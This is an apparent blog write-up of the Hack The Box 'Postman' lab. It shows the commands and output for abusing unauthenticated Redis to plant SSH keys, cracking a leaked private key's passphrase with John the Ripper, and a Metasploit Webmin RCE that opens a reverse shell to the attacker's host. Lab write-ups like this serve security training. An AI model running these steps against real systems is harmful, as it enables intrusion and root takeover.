---
layout: single
title: Postman - Hack The Box
excerpt: "Postman was an easy straight forward box. It had realistic vulnerabilities which had CVEs about them. I had to write my ssh public keys into a redis user authorized_keys file and then connect to the server to obtain another user Matt's private ssh keys which further leads to obtaining access to a Webmin application, vulnerable to a remote code execution to gain root access."
date: 2020-03-13
classes: wide
header:
  teaser: <img src="/assets/images/postman/postman-logo.png">
  teaser_home_page: true
  icon: <img src="/assets/images/hackthebox.png">
categories:
  - hackthebox
tags:
  - redis
  - linux
  - CVE
  - webmin
  - rce
---



## Summary

Postman was an easy straight forward box. It had realistic vulnerabilities which had CVEs about them. I had to write my ssh public keys into a redis user authorized_keys file and then connect to the server to obtain another user Matt's private ssh keys which further leads to obtaining access to a Webmin application, vulnerable to a remote code execution to gain root access.

## Box Details

<img src="/assets/images/postman/postman-logo.png">

## Recon

### Nmap Output

`nmap` shows four ports opened. SSH on TCP 22, HTTP on TCP 80, REDIS on TCP 6379 and another HTTP on TCP 10000

```
# nmap -p- --min-rate 10000 -oA nmap/alltcp -vv 10.10.10.160

Nmap scan report for 10.10.10.160
Host is up, received echo-reply ttl 63 (0.17s latency).
Scanned at 2019-11-02 22:10:37 GMT for 43s
Not shown: 53034 closed ports, 12497 filtered ports
Reason: 53034 resets and 12497 no-responses
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack ttl 63
80/tcp    open  http             syn-ack ttl 63
6379/tcp  open  redis            syn-ack ttl 63
10000/tcp open  snet-sensor-mgmt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Nov  2 22:11:20 2019 -- 1 IP address (1 host up) scanned in 43.56 seconds


# nmap -sU -p- --min-rate 10000 -oA nmap/alludp -vv 10.10.10.160

Nmap scan report for 10.10.10.160
Host is up, received echo-reply ttl 63 (0.47s latency).
Scanned at 2019-11-02 22:12:07 GMT for 83s
Not shown: 65449 open|filtered ports, 85 closed ports
Reason: 65449 no-responses and 85 port-unreaches
PORT      STATE SERVICE REASON
10000/udp open  ndmp    udp-response ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Nov  2 22:13:30 2019 -- 1 IP address (1 host up) scanned in 83.31 seconds
```

`nmap` version scan running default scripts on the identified opened ports showed the following

```

# Nmap 7.80 scan initiated Sat Nov  2 22:14:42 2019 as: nmap -sC -sV -p 22,80,6379,10000 -oA nmap/services 10.10.10.160
Nmap scan report for 10.10.10.160
Host is up (0.14s latency).
Scanned at 2019-11-02 22:14:44 GMT for 38s

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDem1MnCQG+yciWyLak5YeSzxh4HxjCgxKVfNc1LN+vE1OecEx+cu0bTD5xdQJmyKEkpZ+AVjhQo/esF09a94eMNKcp+bhK1g3wqzLyr6kwE0wTncuKD2bA9LCKOcM6W5GpHKUywB5A/TMPJ7UXeygHseFUZEa+yAYlhFKTt6QTmkLs64sqCna+D/cvtKaB4O9C+DNv5/W66caIaS/B/lPeqLiRoX1ad/GMacLFzqCwgaYeZ9YBnwIstsDcvK9+kCaUE7g2vdQ7JtnX0+kVlIXRi0WXta+BhWuGFWtOV0NYM9IDRkGjSXA4qOyUOBklwvienPt1x2jBrjV8v3p78Tzz
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIRgCn2sRihplwq7a2XuFsHzC9hW+qA/QsZif9QKAEBiUK6jv/B+UxDiPJiQp3KZ3tX6Arff/FC0NXK27c3EppI=
|   256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3FKsLVdJ5BN8bLpf80Gw89+4wUslxhI3wYfnS+53Xd
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov  2 22:15:22 2019 -- 1 IP address (1 host up) scanned in 40.72 seconds

```

Based on the OpenSSH and Apache versions, this looks like Ubuntu Bionic (18.04)

## Enumeration

### TCP Port 22

I don't usually enumerate SSH ports unless I have credentials to test. I will leave this and probably get back to it when I find some credentials.

### TCP Port 80

Enumerating the web page showed a landing page with a statement about the site being under construction. Further tests with `nikto` and directory bruteforcing using `dirsearch` did not give any interesting results.

<img src="/assets/images/postman/tcp-80-screenshot.png">

```
$ sudo python3 /opt/dirsearch/dirsearch.py -u 10.10.10.160 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -e php,html -f --plain-text-report postman_brute.txt
[sudo] password for cyb3r:

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, html | HTTP method: get | Threads: 50 | Wordlist size: 661562

Error Log: /opt/dirsearch/logs/errors-20-03-13_11-03-53.log

Target: 10.10.10.160

[11:03:54] Starting:
[11:03:55] 403 -  291B  - /.php
[11:03:55] 403 -  292B  - /.html
[11:03:55] 200 -    4KB - /index.html
[11:03:59] 403 -  293B  - /icons/
[11:03:59] 200 -    2KB - /images/
[11:04:07] 200 -    8KB - /upload/
[11:04:11] 200 -    4KB - /css/
[11:04:20] 200 -    3KB - /js/
[11:05:53] 200 -    3KB - /fonts/
[11:43:44] 403 -  301B  - /server-status/

Task Completed
```

### TCP Port 6379

From the nmap printout, I could see that redis is running on this port. Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. By default Redis binds to all the interfaces and has no authentication at all. The version of redis running on the server is 4.0.9. I can connect to verify if authentication is reuqired or not using telnet:

```
$ telnet 10.10.10.160 6379
Trying 10.10.10.160...
Connected to 10.10.10.160.
Escape character is '^]'.
echo "Hey no AUTH required!"
$21
Hey no AUTH required!
quit
+OK
Connection closed by foreign host
```

This proves that there isn't any authentication required. I can thus leaverage on this to get a remote code execution and get direct access to the server. To do this, I can generate SSH key and append the public key to the server and login using the private keys. More information can be found [here](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html).

### TCP Port 10000

Navigating to the web page served at `http://10.10.10.16`redirects to an https page and took me to a login page for Webmin deployment. Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more. Webmin removes the need to manually edit Unix configuration files like /etc/passwd, and lets you manage a system from the console or remotely. More information can be found [here](http://www.webmin.com/).

From the nmap scan results, I can see the version of Webmin on the server is `1.910` which has [CVE](https://nvd.nist.gov/vuln/detail/CVE-2019-12840) for an authenticated remote code execution where any user authorized to the "Package Updates" module can execute arbitrary commands with root privileges via the data parameter to update.cgi. Thus I need credentials to login to the Webmin and hopefully exploit this vulnerability. However using default credentials as well as trying various SQLi did not work. I will come back to this service if I ever manage to get credentials.

<img src="/assets/images/postman/tcp-10000-login.jpg">

## Gaining Access

### Getting Shell as redis

Having identified that the service is running unauthenticated and thus I will try to gain access by creating SSH keys and append the public keys to the user's authorized_key file and then login with the private key. To do this, I need to find the location of the home directory of the service user account as well as the account name:

```
$ redis-cli -h 10.10.10.160 -p 6379
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
```

From this printout, I can deduce that the user name is `redis` and the home directory is `/var/lib/redis` and can therefore save the SSH keys within the `.ssh` directory. There is a publicly available script to automate this by supplying the right directory and user name. Script can be found [here](https://github.com/Avinash-acid/Redis-Server-Exploit).

Editing the script to provide the correct redis user home directory, I executed it to obtain a shell as user redis:

```
$ python redis.py 10.10.10.160 redis
	*******************************************************************
	* [+] [Exploit] Exploiting misconfigured REDIS SERVER*
	* [+] AVINASH KUMAR THAPA aka "-Acid"
	*******************************************************************


	 SSH Keys Need to be Generated
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): redis
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in redis.
Your public key has been saved in redis.pub.
The key fingerprint is:
SHA256:yIpxrnNtdVFrHg5UFwbxeYrCwFVYjgGyKCn5AgypfxY acid_creative
The key's randomart image is:
+---[RSA 3072]----+
|..    . ..o=*o+. |
|+. . . + .o+.+ . |
|=.o . . o.....o .|
|oo .E. . oo +. o |
|..o ..o S o*...  |
| ..=o.  . ..o    |
|  .oo. . .       |
|  ... o          |
|  .o .           |
+----[SHA256]-----+
	 Keys Generated Successfully
OK
OK
OK
OK
OK
OK
	You'll get shell in sometime..Thanks for your patience

Last login: Tue Dec  3 13:24:55 2019 from 10.10.15.253
redis@Postman:~$ pwd
/var/lib/redis
redis@Postman:~$
```

### redis to Matt

After gaining access to the server and searching for the user.txt file, I noticed it within user Matt's home directory and my current access couldn't read the file:

```
redis@Postman:/home/Matt$ cat user.txt
cat: user.txt: Permission denied
redis@Postman:/home/Matt$
```

To further enumerate the system, I run the LinEnum.sh script to try to find any juicy stuffs to enable me increase privileges on the system. I found a backup of a SSH private key, owned by Matt but readable by every user. I tried connecting to the server as Matt using this private key but it required a passphrase.

```
[-] SSH keys/host information found in the following locations:
-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 /opt/id_rsa.bak

redis@Postman:/tmp$ cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----

$ ssh -i matt_private.key Matt@10.10.10.160
Enter passphrase for key 'matt_private.key':
Enter passphrase for key 'matt_private.key':
```

I can generate a hash using ssh2john and then use JohnTheRipper to crack it. I was able to successfully crack the hash and retrieve the passphrase of `computer2008`

```
$ /opt/JohnTheRipper/run/ssh2john.py matt_private.key > matt_hashes.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt matt_hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (matt_private.key)
1g 0:00:00:20 DONE (2019-12-03 13:57) 0.04819g/s 691166p/s 691166c/s 691166C/sa6_123..*7¡Vamos!
Session completed
```

I tried connecting to the server using the SSH port as Matt but this failed as the connection was closed whenever I tried connecting. Further checks revealed that user Matt is denied access through SSH on the server:

```
$ ssh -i matt_private.key Matt@10.10.10.160
Enter passphrase for key 'matt_private.key':
Connection closed by 10.10.10.160 port 22

redis@Postman:/etc/ssh$ cat sshd_config
..snip...

Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::


#deny users
DenyUsers Matt

...snip...
redis@Postman:/etc/ssh$
```

There's a chance the passphrase for the ssh private key is the same password used for the system. I tried changing user from redis user to Matt and it worked successfully and was able to grab the user.txt

```
redis@Postman:~$ su - Matt
Password:
Matt@Postman:~$ cat user.txt
517ad0ec...........
Matt@Postman:~$
```

## Privilege Escalation

### Matt to root

Having access as Matt now, I run the linux enumeration script `LinEnum.sh` for more enumeration but nothing really popped out except noticing that the process for Webmin was running as user root. Thus based on my initial enumeration of the TCP port 10000 we could leverage this and gain access as root. As the Webmin vulnerability required authentication, it's possible Matt's access could be used on the Webmin application(think credential reuse). I tried using Matt's access and I successfully logged in. Therefore I can use this to gain root access using authenticated remote code execution.

<img src="/assets/images/postman/tcp-10000-auth-login.png">

Using searchsploit, I found a module available in metasploit to exploit this Webmin vulnerability and used the module to gain access to the system as root:

```
msf5 > use exploit/linux/http/webmin_packageup_rce
msf5 exploit(linux/http/webmin_packageup_rce) > set PASSWORD computer2008
PASSWORD => computer2008
msf5 exploit(linux/http/webmin_packageup_rce) > set RHOSTS 10.10.10.160
RHOSTS => 10.10.10.160
msf5 exploit(linux/http/webmin_packageup_rce) > set SSL true
SSL => true
msf5 exploit(linux/http/webmin_packageup_rce) > set USERNAME Matt
USERNAME => Matt
msf5 exploit(linux/http/webmin_packageup_rce) > set LHOST 10.10.15.136
LHOST => 10.10.15.136
msf5 exploit(linux/http/webmin_packageup_rce) > run

[*] Started reverse TCP handler on 10.10.15.136:4444
[+] Session cookie: b8efe036b7567d915ae55d96208b260e
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.15.136:4444 -> 10.10.10.160:37934) at 2019-12-03 22:07:08 +0000
python -c 'import pty;pty.spawn("/bin/bash")'
root@Postman:/usr/share/webmin/package-updates/#

root@Postman:/usr/share/webmin/package-updates/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@Postman:/usr/share/webmin/package-updates/# cat /root/root.txt
cat /root/root.txt
a257741..............
root@Postman:/usr/share/webmin/package-updates/#
```
